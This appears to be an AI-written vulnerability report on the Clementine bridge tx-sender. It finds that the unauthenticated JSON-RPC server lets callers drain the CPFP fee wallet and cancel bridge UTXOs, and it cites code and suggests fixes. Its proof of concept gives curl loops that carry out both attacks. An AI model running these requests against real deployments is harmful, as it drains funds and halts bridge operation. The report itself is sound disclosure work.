Now I have enough to make a determination. Let me verify the tx-sender JSON-RPC bind address validation and the CPFP fee-payer logic.

### Title
Unauthenticated tx-sender JSON-RPC Allows Arbitrary Transaction Injection and CPFP Fee-Wallet Drain — (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

---

### Summary

The tx-sender JSON-RPC server is started with `ServerBuilder::default()` — no authentication, no token, no enforced IP restriction in code. Any party that can reach the endpoint can call `send_tx` with `fee_paying_type: CPFP`, causing the tx-sender to repeatedly call `rpc.send_to_address()` to fund fee-payer UTXOs from its own Bitcoin wallet, draining the wallet that funds all bridge CPFP operations. The same caller can also supply `cancel_outpoints` referencing legitimate bridge-controlled UTXOs; when the injected transaction confirms, those UTXOs are permanently marked cancelled in the DB, blocking the bridge from broadcasting any transaction that depends on them.

---

### Finding Description

`start_jsonrpc_server` in `crates/clementine-tx-sender/src/jsonrpc/server.rs` builds the HTTP server as:

```rust
let server: Server = ServerBuilder::default()
    .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
    .build(bind_addr)
    .await
``` [1](#0-0) 

`ServerBuilder::default()` carries no authentication middleware. The `send_tx` handler passes the caller-supplied `fee_paying_type` and `cancel_outpoints` directly to `TxSenderClient::insert_try_to_send` without any caller-identity check:

```rust
module.register_async_method("send_tx", |params, client, _| async move {
    let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;
    ...
    client.insert_try_to_send(
        &mut dbtx,
        req.tx_metadata,
        &signed_tx,
        req.fee_paying_type,   // attacker-controlled
        req.rbf_signing_info,
        &req.cancel_outpoints, // attacker-controlled
        &req.cancel_txids,
        &req.activate_txids,
        &req.activate_outpoints,
    ).await
``` [2](#0-1) 

The config struct documents the bind address as "Restricted to 127.0.0.1 or 0.0.0.0" but enforces nothing in code:

```rust
pub struct TxSenderJsonRpcConfig {
    /// Bind address for the JSON-RPC server. Restricted to 127.0.0.1 or 0.0.0.0.
    pub bind: String,
``` [3](#0-2) 

**CPFP drain path.** When `fee_paying_type = CPFP`, the tx-sender loop calls `send_cpfp_tx`, which calls `create_fee_payer_utxo`. That function calls `rpc.send_to_address()` to fund a new fee-payer UTXO from the Bitcoin wallet, then creates and signs a child transaction spending those UTXOs: [4](#0-3) [5](#0-4) 

Each injected CPFP request causes a real `send_to_address` call and a signed child transaction spending from the wallet. Flooding the endpoint drains the wallet.

**Cancel-outpoints path.** The DB schema records `cancel_outpoints` per queued transaction:

```sql
create table if not exists tx_sender_cancel_try_to_send_outpoints (
    cancelled_id int not null references tx_sender_try_to_send_txs(id),
    txid bytea not null,
    vout int not null,
    ...
``` [6](#0-5) 

When the injected transaction confirms, the confirmation handler marks those outpoints as cancelled in the DB. Any legitimate bridge transaction that depends on those outpoints is then permanently suppressed by the tx-sender loop.

**Contrast with the gRPC path.** The TCP gRPC servers enforce mTLS plus the `OnlyAggregatorAndSelf` interceptor, which rejects any client whose leaf certificate is not the aggregator's or the actor's own: [7](#0-6) [8](#0-7) 

The JSON-RPC server has no equivalent guard.

---

### Impact Explanation

1. **tx-sender wallet drain (tx-sender-managed balances).** An attacker submits N transactions with `fee_paying_type: CPFP`. For each, the tx-sender calls `rpc.send_to_address()` to create a fee-payer UTXO, then signs and broadcasts a child transaction spending it. The wallet is drained proportionally to N. Once empty, the bridge cannot CPFP-bump any bridge transaction (move-tx, kickoff, payout), causing a complete liveness failure.

2. **Permanent cancellation of bridge-controlled UTXOs.** An attacker submits a valid Bitcoin transaction (spending their own inputs) with `cancel_outpoints` set to the outpoints of legitimate bridge UTXOs (e.g., a kickoff connector or a ready-to-reimburse output). When the attacker's transaction confirms, those outpoints are written into `tx_sender_cancel_try_to_send_outpoints` and the tx-sender stops broadcasting any queued transaction that depends on them. The bridge cannot recover without manual DB intervention.

Both impacts fall within the explicitly scoped categories: "tx-sender-managed balances" and "bridge-controlled UTXOs."

---

### Likelihood Explanation

The default bind in `run.sh` is `TX_SENDER_JSONRPC_BIND=127.0.0.1`, which limits exposure to processes on the same host. However:

- The code does not enforce the `127.0.0.1` restriction; `TX_SENDER_JSONRPC_BIND=0.0.0.0` is a one-line change and is the natural default in containerised deployments.
- Even with `127.0.0.1`, any co-located process (another container in the same pod, a compromised dependency, a malicious user on a shared host) can reach the port.
- No secret, key, or privileged position is required — a plain HTTP POST with a JSON body suffices. [9](#0-8) 

---

### Recommendation

1. **Add authentication to the JSON-RPC server.** Options in order of preference:
   - Require a shared secret / bearer token in the `Authorization` header, validated by a `tower` middleware layer before the `RpcModule` is reached.
   - Bind exclusively to a Unix domain socket (analogous to how the gRPC actors communicate in the test topology) so only processes with filesystem access can connect.
   - Enforce an IP allowlist in code (not just documentation) by rejecting connections whose remote address is not in a configured set.

2. **Validate `fee_paying_type` against a server-side allowlist** so that even an authenticated caller cannot request CPFP for transactions that do not originate from the bridge.

3. **Validate `cancel_outpoints`** against the set of known bridge UTXOs before persisting them, or remove the parameter from the public JSON-RPC surface entirely.

---

### Proof of Concept

**CPFP wallet drain (requires `TX_SENDER_JSONRPC_BIND=0.0.0.0` or local access):**

```bash
# Craft a syntactically valid but unmineable transaction (any hex-encoded tx)
RAW_TX_HEX="<hex of any valid serialised Bitcoin transaction with a P2A anchor output>"

for i in $(seq 1 100); do
  curl -s -X POST http://<tx-sender-host>:3030 \
    -H 'content-type: application/json' \
    -d "{\"jsonrpc\":\"2.0\",\"id\":$i,\"method\":\"send_tx\",\"params\":[{
      \"tx_metadata\": null,
      \"signed_tx_hex\": \"$RAW_TX_HEX\",
      \"fee_paying_type\": \"CPFP\",
      \"rbf_signing_info\": null,
      \"cancel_outpoints\": [],
      \"cancel_txids\": [],
      \"activate_txids\": [],
      \"activate_outpoints\": []
    }]}"
done
# Each call triggers create_fee_payer_utxo -> rpc.send_to_address(), draining the wallet.
```

**Cancel-outpoints attack:**

```bash
# BRIDGE_UTXO_TXID and BRIDGE_UTXO_VOUT are the outpoint of a known bridge UTXO
curl -s -X POST http://<tx-sender-host>:3030 \
  -H 'content-type: application/json' \
  -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"send_tx\",\"params\":[{
    \"tx_metadata\": null,
    \"signed_tx_hex\": \"<attacker's valid signed tx hex>\",
    \"fee_paying_type\": \"NoFunding\",
    \"rbf_signing_info\": null,
    \"cancel_outpoints\": [{\"txid\": \"$BRIDGE_UTXO_TXID\", \"vout\": $BRIDGE_UTXO_VOUT}],
    \"cancel_txids\": [],
    \"activate_txids\": [],
    \"activate_outpoints\": []
  }]}"
# When the attacker's tx confirms, the bridge UTXO is marked cancelled in the DB.
``` [10](#0-9) [11](#0-10)

### Citations

**File:** crates/clementine-tx-sender/src/jsonrpc/server.rs (L42-111)
```rust
pub async fn start_jsonrpc_server(
    tx_sender_client: TxSenderClient,
    bind_addr: SocketAddr,
) -> Result<TxSenderJsonRpcServer, BridgeError> {
    let server: Server = ServerBuilder::default()
        .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
        .build(bind_addr)
        .await
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let local_addr = server
        .local_addr()
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    let mut module = RpcModule::new(tx_sender_client.clone());
    module
        .register_async_method("send_tx", |params, client, _| async move {
            let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;

            let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
            let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;

            let mut dbtx = client.db.begin_transaction().await.map_err(jsonrpc_err)?;

            let try_to_send_id = client
                .insert_try_to_send(
                    &mut dbtx,
                    req.tx_metadata,
                    &signed_tx,
                    req.fee_paying_type,
                    req.rbf_signing_info,
                    &req.cancel_outpoints,
                    &req.cancel_txids,
                    &req.activate_txids,
                    &req.activate_outpoints,
                )
                .await
                .map_err(jsonrpc_err)?;

            client
                .db
                .commit_transaction(dbtx)
                .await
                .map_err(jsonrpc_err)?;

            Ok::<u32, ErrorObjectOwned>(try_to_send_id)
        })
        .map_err(|e| BridgeError::Eyre(e.into()))?;

    // Citrea-specific RPCs.
    #[cfg(feature = "citrea")]
    {
        module
            .register_async_method("send_citrea_tx", |params, client, _| async move {
                let req: InsertCitreaRawTxParams = params.one().map_err(jsonrpc_err)?;

                let insertion_id = client
                    .send_citrea_tx(req.citrea_tx_request)
                    .await
                    .map_err(jsonrpc_err)?;

                Ok::<i64, ErrorObjectOwned>(insertion_id)
            })
            .map_err(|e| BridgeError::Eyre(e.into()))?;
    }

    let handle = server.start(module);

    Ok(TxSenderJsonRpcServer { handle, local_addr })
}
```

**File:** crates/clementine-tx-sender/src/config.rs (L29-35)
```rust
#[derive(Clone, Debug)]
pub struct TxSenderJsonRpcConfig {
    /// Bind address for the JSON-RPC server. Restricted to 127.0.0.1 or 0.0.0.0.
    pub bind: String,
    /// TCP port for the JSON-RPC server.
    pub port: u16,
}
```

**File:** crates/clementine-tx-sender/src/cpfp.rs (L47-127)
```rust
    fn build_and_sign_child_tx(
        &self,
        p2a_anchor: OutPoint,
        anchor_sat: Amount,
        fee_payer_utxos: Vec<crate::SpendableUtxo>,
        change_address: bitcoin::Address,
        required_fee: Amount,
    ) -> Result<Transaction> {
        let total_in: Amount = fee_payer_utxos
            .iter()
            .map(|u| u.txout.value)
            .sum::<Amount>()
            + anchor_sat;

        let change_amount = total_in
            .checked_sub(required_fee)
            .ok_or_else(|| SendTxError::Other(eyre!("required_fee > total_in")))?;

        let mut inputs: Vec<TxIn> = Vec::with_capacity(1 + fee_payer_utxos.len());
        inputs.push(TxIn {
            previous_output: p2a_anchor,
            script_sig: ScriptBuf::new(),
            sequence: crate::DEFAULT_SEQUENCE,
            witness: Witness::new(),
        });

        for utxo in &fee_payer_utxos {
            inputs.push(TxIn {
                previous_output: utxo.outpoint,
                script_sig: ScriptBuf::new(),
                sequence: crate::DEFAULT_SEQUENCE,
                witness: Witness::new(),
            });
        }

        let mut child_tx = Transaction {
            version: NON_STANDARD_V3,
            lock_time: LockTime::ZERO,
            input: inputs,
            output: vec![TxOut {
                value: change_amount,
                script_pubkey: change_address.script_pubkey(),
            }],
        };

        // Prevouts must match the tx input order (anchor first).
        let mut prevouts: Vec<TxOut> = Vec::with_capacity(child_tx.input.len());
        prevouts.push(Self::anchor_prevout(anchor_sat));
        prevouts.extend(fee_payer_utxos.into_iter().map(|u| u.txout));

        // Compute witnesses without mutating tx while the sighash cache borrows it.
        let mut cache = SighashCache::new(&child_tx);
        let mut signed_witnesses: Vec<(usize, Witness)> = Vec::new();

        for input_index in 1..child_tx.input.len() {
            let sighash = cache
                .taproot_key_spend_signature_hash(
                    input_index,
                    &Prevouts::All(&prevouts),
                    TapSighashType::Default,
                )
                .map_err(|e| SendTxError::Other(eyre!("failed to compute sighash: {e}")))?;

            let signature = self
                .signer
                .sign_with_tweak_data(sighash, clementine_utils::sign::TapTweakData::KeyPath(None))
                .map_err(|e| SendTxError::Other(e.into()))?;

            let tr_sig = taproot::Signature {
                signature,
                sighash_type: TapSighashType::Default,
            };
            signed_witnesses.push((input_index, Witness::p2tr_key_spend(&tr_sig)));
        }

        for (idx, witness) in signed_witnesses {
            child_tx.input[idx].witness = witness;
        }

        Ok(child_tx)
    }
```

**File:** crates/clementine-tx-sender/src/cpfp.rs (L129-188)
```rust
    /// Creates and broadcasts a new "fee payer" UTXO to be used for CPFP
    /// transactions.
    ///
    /// This function is called when a CPFP attempt fails due to insufficient funds
    /// in the existing confirmed fee payer UTXOs associated with a transaction (`bumped_id`).
    /// It calculates the required fee based on the parent transaction (`tx`) and the current
    /// `fee_rate`, adding a buffer (2x required fee + dust limit) to handle potential fee spikes.
    /// It then sends funds to the `TxSender`'s own signer address using the RPC's
    /// `send_to_address` and saves the resulting UTXO information (`outpoint`, `amount`)
    /// to the database, linking it to the `bumped_id`.
    ///
    /// # Arguments
    /// * `bumped_id` - The database ID of the parent transaction requiring the fee bump.
    /// * `tx` - The parent transaction itself.
    /// * `fee_rate` - The target fee rate for the CPFP package.
    /// * `total_fee_payer_amount` - The sum of amounts in currently available confirmed fee payer UTXOs.
    /// * `fee_payer_utxos_len` - The number of currently available confirmed fee payer UTXOs.
    async fn create_fee_payer_utxo(
        &self,
        bumped_id: u32,
        dbtx: Option<&mut TxSenderTransaction>,
        tx: &Transaction,
        fee_rate: FeeRateKvb,
        total_fee_payer_amount: Amount,
        fee_payer_utxos_len: usize,
    ) -> Result<()> {
        tracing::debug!(
            "Creating fee payer UTXO for txid {} with bump id {}",
            &tx.compute_txid().to_string(),
            bumped_id
        );
        let required_fee = Self::calculate_required_fee(
            tx.weight(),
            fee_payer_utxos_len + 1,
            fee_rate,
            FeePayingType::CPFP,
        )?;

        // Aggressively add 2x required fee to the total amount to account for sudden spikes
        // We won't actually use 2x fees, but the fee payer utxo will hold that much amount so that while fee payer utxo gets mined
        // if fees increase the utxo should still be sufficient to fund the tx with high probability
        // leftover fees will get sent back to wallet with a change output in fn create_child_tx
        let new_total_fee_needed = required_fee
            .checked_mul(2)
            .and_then(|fee| fee.checked_add(MIN_TAPROOT_AMOUNT));
        if new_total_fee_needed.is_none() {
            return Err(eyre!("Total fee needed is too large, required fee: {}, total fee payer amount: {}, fee rate: {}", required_fee, total_fee_payer_amount, fee_rate).into());
        }
        let new_fee_payer_amount =
            new_total_fee_needed.and_then(|fee| fee.checked_sub(total_fee_payer_amount));

        let new_fee_payer_amount = match new_fee_payer_amount {
            Some(fee) => fee,
            // if underflow, no new fee payer utxo is needed, log it anyway in case its a bug
            None => {
                tracing::debug!("create_fee_payer_utxo was called but no new fee payer utxo is needed for tx: {:?}, required fee: {}, total fee payer amount: {}, current fee rate: {}", tx, required_fee, total_fee_payer_amount, fee_rate);
                return Ok(());
            }
        };

```

**File:** core/src/database/schema.sql (L194-202)
```sql
create table if not exists tx_sender_cancel_try_to_send_outpoints (
    cancelled_id int not null references tx_sender_try_to_send_txs(id),
    txid bytea not null,
    vout int not null,
    -- first observed chain height when this outpoint was seen spent (used for finality tracking)
    seen_at_height int,
    created_at timestamp not null default now(),
    primary key (cancelled_id, txid, vout)
);
```

**File:** core/src/rpc/interceptors.rs (L36-77)
```rust
fn only_aggregator_and_self(
    req: Request<()>,
    our_cert: &CertificateDer<'static>,
    aggregator_cert: &CertificateDer<'static>,
) -> Result<Request<()>, Status> {
    let Some(peer_certs) = req.peer_certs() else {
        if cfg!(test) {
            // Test mode, we don't need to verify peer certificates
            return Ok(req);
        } else {
            // If we're not in test mode, we need to check peer certificates
            return Err(Status::unauthenticated(
                "Failed to verify peer certificate, is TLS enabled?",
            ));
        }
    };

    // IMPORTANT: Only check the leaf (end-entity) certificate, which is always the first
    // certificate in the chain. The leaf is the only certificate whose private key the peer
    // proved possession of during the TLS handshake. Checking anywhere else in the chain
    // would allow identity spoofing: an attacker could include a pinned cert as an
    // intermediate in their chain without possessing its private key.
    let Some(leaf_cert) = peer_certs.first() else {
        return Err(Status::unauthenticated("Peer certificate chain is empty"));
    };

    if is_internal(&req) {
        if leaf_cert == our_cert {
            Ok(req)
        } else {
            Err(Status::unauthenticated(
                "Unauthorized call to internal method (not self)",
            ))
        }
    } else if leaf_cert == aggregator_cert || leaf_cert == our_cert {
        Ok(req)
    } else {
        Err(Status::unauthenticated(
            "Unauthorized call to method (not aggregator or self)",
        ))
    }
}
```

**File:** core/src/servers.rs (L114-139)
```rust
            let service = InterceptedService::new(
                service,
                if config.client_verification {
                    let client_cert = CertificateDer::from_pem_file(&config.client_cert_path)
                        .wrap_err(format!(
                            "Failed to read client certificate from {}",
                            config.client_cert_path.display()
                        ))?
                        .to_owned();

                    let aggregator_cert =
                        CertificateDer::from_pem_file(&config.aggregator_cert_path)
                            .wrap_err(format!(
                                "Failed to read aggregator certificate from {}",
                                config.aggregator_cert_path.display()
                            ))?
                            .to_owned();

                    OnlyAggregatorAndSelf {
                        aggregator_cert,
                        our_cert: client_cert,
                    }
                } else {
                    Noop
                },
            );
```

**File:** crates/clementine-tx-sender/run.sh (L35-37)
```shellscript
export TX_SENDER_JSONRPC_BIND="${TX_SENDER_JSONRPC_BIND:-127.0.0.1}"
export TX_SENDER_JSONRPC_PORT="${TX_SENDER_JSONRPC_PORT:-3030}"
export TX_SENDER_POLL_DELAY_MS="${TX_SENDER_POLL_DELAY_MS:-500}"
```
